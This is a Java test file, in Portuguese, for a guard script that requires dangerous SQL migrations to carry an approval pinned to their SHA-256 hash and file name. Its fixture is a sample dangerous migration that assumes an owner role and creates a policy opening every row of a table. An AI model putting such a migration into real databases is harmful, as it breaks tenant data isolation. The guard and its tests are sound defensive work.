    static final String PERIGOSA = "SET ROLE saas_owner;\nCREATE POLICY p ON saas.x USING (true);\nRESET ROLE;\n";

    @Test
    void aprovacaoPresaAoSha256EAoNome() throws Exception {
        Path dir = migracao("V9__politica.sql", PERIGOSA);
        String sha = sha256(PERIGOSA);

        // aprovada: sha e nome conferem
        Resultado ok = guarda(dir, aprovacoes("# revisada pelo Red Team no PR", sha + "  V9__politica.sql"));
        assertThat(ok.codigo()).as(ok.saida()).isZero();
        assertThat(ok.saida()).contains("APROVADA");

        // nome diferente com o mesmo conteudo: recusada
        Files.move(dir.resolve("V9__politica.sql"), dir.resolve("V10__politica.sql"));
        assertThat(guarda(dir, aprovacoes(sha + "  V9__politica.sql")).codigo()).isEqualTo(1);
        Files.move(dir.resolve("V10__politica.sql"), dir.resolve("V9__politica.sql"));

        // conteudo mudou um byte: perde a aprovacao
        Files.writeString(dir.resolve("V9__politica.sql"), PERIGOSA + " ");
        assertThat(guarda(dir, aprovacoes(sha + "  V9__politica.sql")).codigo()).isEqualTo(1);

        // sha de outro arquivo com o nome certo: recusada
        Files.writeString(dir.resolve("V9__politica.sql"), PERIGOSA);
        assertThat(guarda(dir, aprovacoes(sha256("outro") + "  V9__politica.sql")).codigo()).isEqualTo(1);

        // modo binario do sha256sum ("*nome") tambem vale
        assertThat(guarda(dir, aprovacoes(sha + " *V9__politica.sql")).codigo()).isZero();
    }

    @Test
    void arquivoDeAprovacoesMalFormadoFalha() throws Exception {
        Path dir = migracao("V9__politica.sql", PERIGOSA);
        Resultado r = guarda(dir, aprovacoes("aprovado: V9__politica.sql"));
        assertThat(r.codigo()).isEqualTo(2);
    }

    @Test
    void usoErradoFalha() throws Exception {
        Process p = new ProcessBuilder("bash", GUARDA.toString()).redirectErrorStream(true).start();
        p.getInputStream().readAllBytes();
        assertThat(p.waitFor(30, TimeUnit.SECONDS)).isTrue();
        assertThat(p.exitValue()).isEqualTo(2);
        Resultado r = guarda(tmp.resolve("nao-existe"), semAprovacoes());
        assertThat(r.codigo()).isEqualTo(2);
    }
}
